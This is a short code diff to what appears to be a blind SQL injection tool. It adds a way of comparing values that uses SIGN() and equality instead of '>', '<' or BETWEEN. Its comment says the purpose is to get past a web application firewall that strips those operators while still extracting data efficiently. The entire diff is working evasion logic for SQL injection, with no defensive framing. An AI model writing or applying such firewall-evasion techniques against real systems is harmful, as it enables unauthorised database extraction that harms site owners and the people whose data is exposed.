@@ -429,6 +429,11 @@ class _Discovery(object):
             elif self._ask("2 BETWEEN 2 AND 3") and not self._ask("5 BETWEEN 2 AND 3"):
                 self._comparator = "between"
                 self.dialect.notes.append("'>' unusable; bisecting via BETWEEN")
+            elif self._ask("SIGN(2-1)=1") and not self._ask("SIGN(2-3)=1") and not self._ask("SIGN(2-2)=1"):
+                # ordered, log2-efficient, yet needs NO comparison operator (only SIGN(), '-', '=') -
+                # survives a WAF stripping '>' AND '<' AND BETWEEN, without dropping to slow membership
+                self._comparator = "sign"
+                self.dialect.notes.append("'>'/BETWEEN unusable; bisecting via SIGN() (no comparison operator)")
             else:
                 self._comparator = "membership"
                 self.dialect.notes.append("no ordered comparator; using order-free IN() subset bisection")
